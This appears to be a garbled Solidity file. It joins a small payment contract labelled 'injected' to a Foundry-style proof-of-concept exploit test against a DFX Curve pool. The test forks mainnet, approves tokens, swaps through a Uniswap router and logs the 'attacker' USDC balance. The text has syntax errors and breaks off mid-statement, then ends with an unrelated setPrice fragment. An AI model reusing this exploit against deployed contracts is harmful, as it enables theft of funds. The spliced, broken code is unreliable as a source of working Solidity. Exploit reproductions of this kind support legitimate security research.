
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function dataPayment(address payable recipient, uint amount) public payable {
        require(msg.value >= amount, "Insufficient payment");
        recipient.transfer(amount);
        emit PaymentProcessed(msg.sender, recipient, amount);
    }
}
pragma solidity ^0.8.10;

;
;
interface Curve{
    function flash(address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data) external;
    function viewDeposit(uint256 _deposit) external view returns (uint256, uint256[] memory);
    function deposit(uint256 _deposit, uint256 _deadline) external returns (uint256, uint256[] memory);
    function withdraw(uint256 _curvesToBurn, uint256 _deadline) external};
contract ContractTest is DSTest{
    IERC20 XIDR = IERC20(0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    Curve dfx =Curve(0x46161158b1947D9149E066d6d31AF1283b2d377C);
    uint256 receiption;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("mainnet", 15941703)};
    function testExploit() public{
        address(WETH).call{value: 2 ether}("");
        WETH.approve(address(Router), type(uint).max);
        USDC.approve(address(Router), type(uint).max);
        USDC.approve(address(dfx), type(uint).max);
        XIDR.approve(address(Router), type(uint).max);
        XIDR.approve(address(dfx), type(uint).max);
        WETHToUSDC();
        emit log_named_decimal_uint("[Before] Attacker USDC balance before exploit",
            USDC.balanceOf(address(this)),;
            6);
        USDCToXIDR();
        uint[] memory XIDR_USDC = new uint[](2);
        XIDR_USDC[0
function setPrice(uint newPrice) public {
    price = newPrice}